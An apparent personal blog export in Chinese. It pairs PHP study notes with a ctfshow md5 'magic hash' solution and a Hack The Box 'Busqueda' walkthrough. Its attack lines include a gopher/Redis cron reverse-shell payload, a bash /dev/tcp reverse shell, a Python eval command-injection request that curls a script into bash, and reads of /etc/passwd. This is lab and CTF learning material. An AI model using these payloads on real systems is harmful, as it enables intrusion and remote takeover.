<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;2.php&quot;</span>;</span><br><span class="line"><span class="comment">//2.php的函数直接调用</span></span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-php数组结构"><a href="#9-php数组结构" class="headerlink" title="9.php数组结构"></a>9.php数组结构</h2><p>array(参数可以是任意类型)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$shuzu</span> = <span class="keyword">array</span>(<span class="number">1</span> , <span class="number">1.5</span> , <span class="literal">true</span> ,<span class="string">&#x27;hellophp&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$shuzu</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:</p>
<p>array(4) { [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; float(1.5) [2]&#x3D;&gt; bool(true) [3]&#x3D;&gt; string(8) “hellophp” }</p>
</blockquote>
<p>索引也可以不从0开始，那就需要自己设置键值对</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$shuzu</span> = <span class="keyword">array</span>(<span class="number">10</span>=&gt;<span class="number">1</span> , <span class="number">1.5</span> , <span class="number">20</span>=&gt;<span class="literal">true</span> ,<span class="string">&#x27;hellophp&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$shuzu</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [10]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [11]=&gt;</span><br><span class="line">  float(1.5)</span><br><span class="line">  [20]=&gt;</span><br><span class="line">  bool(true)</span><br><span class="line">  [21]=&gt;</span><br><span class="line">  string(8) &quot;hellophp&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>访问数组的话， <code>$shuzu[\$i]</code>即可</p>
<p><code>count($shuzu)</code>可以获得所有元素个数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>array_shift</td>
<td>弹出数组中的第一个元素</td>
</tr>
<tr>
<td>array_unshift</td>
<td>在数组的开始处压入元素</td>
</tr>
<tr>
<td>array_push</td>
<td>向数组的末尾处压入元素</td>
</tr>
<tr>
<td>array_pop</td>
<td>弹出数组末尾的最后一个元素</td>
</tr>
<tr>
<td>current</td>
<td>读出指针当前位置的值</td>
</tr>
<tr>
<td>key</td>
<td>读出指针当前位置的键</td>
</tr>
<tr>
<td>next</td>
<td>指针向下移</td>
</tr>
<tr>
<td>prev</td>
<td>向上移</td>
</tr>
<tr>
<td>reset</td>
<td>指针到开始处</td>
</tr>
<tr>
<td>end</td>
<td>指针到结束处</td>
</tr>
</tbody></table>
<h2 id="10-php正则"><a href="#10-php正则" class="headerlink" title="10.php正则"></a>10.php正则</h2><p>主要用来匹配。</p>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配任意一个字符（除了\n）</td>
</tr>
<tr>
<td>[]</td>
<td>匹配[]中列举的字符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
</tr>
<tr>
<td>\D</td>
<td>非数字</td>
</tr>
<tr>
<td>\s</td>
<td>匹配空白，空格或TAB键</td>
</tr>
<tr>
<td>\S</td>
<td>非空白</td>
</tr>
<tr>
<td>\w</td>
<td>单词字符</td>
</tr>
<tr>
<td>\W</td>
<td>非单词字符</td>
</tr>
</tbody></table>
<h4 id="数量"><a href="#数量" class="headerlink" title="数量"></a>数量</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配前一个字符出现0次或无数次</td>
</tr>
<tr>
<td>+</td>
<td>匹配前一个字符出现1或无线次</td>
</tr>
<tr>
<td>?</td>
<td>匹配前一个字符出现1次或0次</td>
</tr>
<tr>
<td>{m}</td>
<td>匹配前一个字符出现m次</td>
</tr>
<tr>
<td>{m,}</td>
<td>匹配前一个字符至少出现m次</td>
</tr>
<tr>
<td>{m,n}</td>
<td>匹配前一个字符出现从m到n次</td>
</tr>
</tbody></table>
<h4 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配字符串开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
</tr>
<tr>
<td>\b</td>
<td>匹配一个单词的边界</td>
</tr>
<tr>
<td>\B</td>
<td>匹配非单词边界</td>
</tr>
</tbody></table>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><table>
<thead>
<tr>
<th>字符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>|</td>
<td>匹配左右任意一个表达式</td>
</tr>
<tr>
<td>(ab)</td>
<td>将括号中字符作为分组</td>
</tr>
<tr>
<td>\num</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>preg_filter</td>
<td>执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td>preg_grep</td>
<td>返回匹配模式的数组条目</td>
</tr>
<tr>
<td>preg_match</td>
<td>执行一个正则表达式匹配</td>
</tr>
<tr>
<td>preg_match_all</td>
<td>执行一个全局正则表达式匹配</td>
</tr>
<tr>
<td>preg_replace</td>
<td>执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td>preg_split</td>
<td>通过一个正则表达式分割字符串</td>
</tr>
</tbody></table>
<h2 id="11-文件操作"><a href="#11-文件操作" class="headerlink" title="11.文件操作"></a>11.文件操作</h2><h3 id="1-读取文件"><a href="#1-读取文件" class="headerlink" title="1.读取文件"></a>1.读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile ( string: $文件名)</span><br><span class="line">功能：传入一个文件路径，输出一个文件。</span><br><span class="line"></span><br><span class="line">file_get_contents(string: $文件名)打开文件函数</span><br><span class="line"></span><br><span class="line">fopen   (r,r+,w,w+,a,a+)</span><br><span class="line">fread</span><br><span class="line">fclose</span><br></pre></td></tr></table></figure>

<h3 id="2-创建和修改文件内容"><a href="#2-创建和修改文件内容" class="headerlink" title="2.创建和修改文件内容"></a>2.创建和修改文件内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents ( string $文件路径, string $写入数据)</span><br><span class="line">功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$data</span> = <span class="string">&quot;学好PHP&quot;</span>;</span><br><span class="line">   <span class="variable">$numbytes</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$numbytes</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入成功，我们读取看看结果试试：&#x27;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入失败或者没有权限，注意检查&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>覆盖写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">   <span class="variable">$fp</span>= <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>); <span class="comment">//w写，a可以追加写</span></span><br><span class="line">   <span class="variable">$len</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;原文内容会被覆盖&#x27;</span>);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">   <span class="keyword">print</span> <span class="variable">$len</span> .<span class="string">&#x27;字节被写入了\n&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-创建临时文件"><a href="#3-创建临时文件" class="headerlink" title="3.创建临时文件"></a>3.创建临时文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  <span class="variable">$handle</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">   <span class="comment">//向里面写入了数据</span></span><br><span class="line">   <span class="variable">$numbytes</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&#x27;写入临时文件&#x27;</span>);</span><br><span class="line">   <span class="comment">//关闭临时文件，文件即被删除</span></span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">   <span class="keyword">echo</span>  <span class="string">&#x27;向临时文件中写入了&#x27;</span>.<span class="variable">$numbytes</span> . <span class="string">&#x27;个字节&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-移动、拷贝、删除文件"><a href="#4-移动、拷贝、删除文件" class="headerlink" title="4.移动、拷贝、删除文件"></a>4.移动、拷贝、删除文件</h3><blockquote>
<p>重命名：rename($old,$new)</p>
<p>复制：copy($old,$new)</p>
<p>删除：unlink()</p>
<p>文件属性函数：file_exists…</p>
<p>目录处理函数：opendir&#x2F;closedir&#x2F;filetype</p>
<p>文件权限设置：chmod(文件名，777)</p>
<p>文件路径函数：pathinfo(返回文件的各个组成部分)&#x2F;basename(文件名)…</p>
</blockquote>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h1 id="相关漏洞函数"><a href="#相关漏洞函数" class="headerlink" title="相关漏洞函数"></a>相关漏洞函数</h1><ul>
<li><p><code>file_get_content()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$content = file_get_contents($_GET[&#x27;url&#x27;]);</span><br><span class="line">// 通过 file_get_contents 直接获取 URL，保存到 content，之后利用</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>cURL - curl_exec()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function curl($url)&#123;</span><br><span class="line">      $ch = curl_init();</span><br><span class="line">   curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">   curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">   curl_exec($ch);</span><br><span class="line">   curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">curl($url);</span><br><span class="line">// 初始化一个 curl 获取 URL，之后利用</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>cURL默认支持的协议很多</strong></p>
<p>file协议查看文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &#x27;file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>

<p>dict协议探测端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &#x27;dict://10.11.2.1:6379/info&#x27; #redis</span><br></pre></td></tr></table></figure>

<p>gopher反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &#x27;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp、ftps （FTP匿名访问、爆破）</span><br><span class="line"> tftp （UDP协议扩展）</span><br><span class="line"> imap/imaps/pop3/pop3s/smtp/smtps （爆破邮件用户名密码）</span><br><span class="line"> smb/smbs （SMB匿名访问及爆破）</span><br><span class="line"> telnet （连接SSH/Telnet，匿名访问及爆破）</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="1-web5"><a href="#1-web5" class="headerlink" title="1.web5"></a>1.web5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> <code>ctype_alpha</code>检测所给参数是不是字母的函数。</p>
<p>v2又要求是数字</p>
<p>字母和数字的哈希值要相等，当然不可能哈</p>
<p>所以要构造一下，使得</p>
<p><strong>双方的哈希值都以 <code>0e</code> 开头，紧跟着一串数字；这样会被php解释为科学技术法中的0</strong></p>
<p>v1&#x3D;QNKCDZO 和v2&#x3D;240610708</p>
</blockquote>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>开发语言</tag>
      </tags>
  </entry>
  <entry>
    <title>hack the box</title>
    <url>/2023/06/18/hack-the-box/</url>
    <content><![CDATA[<p>下载htb的openvpn文件后，openvpn 文件</p>
<p>目的是获取user.txt和root.txt</p>
<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
<p><a href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
<p>ping一遍，能ping通</p>
<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
<p>火狐直接访问，访问不了</p>
<p>在hosts文件添加域名</p>
<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
<p>选了个google，查找内容为123</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
<p>很明显，post。</p>
<p>抓包试试，加个单引号不显示内容</p>
<p>sqlmap一下，没有注入点。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
<p>点击后，发现如下东西：</p>
<blockquote>
<p>Custom Engine</p>
<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
<p>Searchor CLI Quick Start</p>
<p>$ searchor Google “Hello World!” –copy</p>
</blockquote>
<p>这是调用引擎库去获取数据吧。</p>
<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
<blockquote>
<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
</blockquote>
<p>在bp上这样构造：</p>
<blockquote>
<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
</blockquote>
<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
<p>效果是这样的，</p>
<blockquote>
<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
</blockquote>
<p>相当于执行了参数为:</p>
<p><strong>‘</strong>123’ </p>
<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
<p>和&#39;‘</p>
<p>repeat结果里是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那其实ls可以改为 cat app.py，出现一串代码</p>
<p>shift+ctrl+u后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
<p>(不明觉厉o(￣▽￣)ｄ )</p>
<p>。。。然后捏，我没监听到东西。</p>
<p>可能<strong>是因为kali有防火墙</strong></p>
<p><code>sudo systemctl stop ufw</code></p>
<p><code>sudo systemctl disable ufw</code></p>
<p>将防火墙禁用，重新发包即可。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
<p>nc监听成功。</p>
<p>然后在nc窗口下</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>

<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
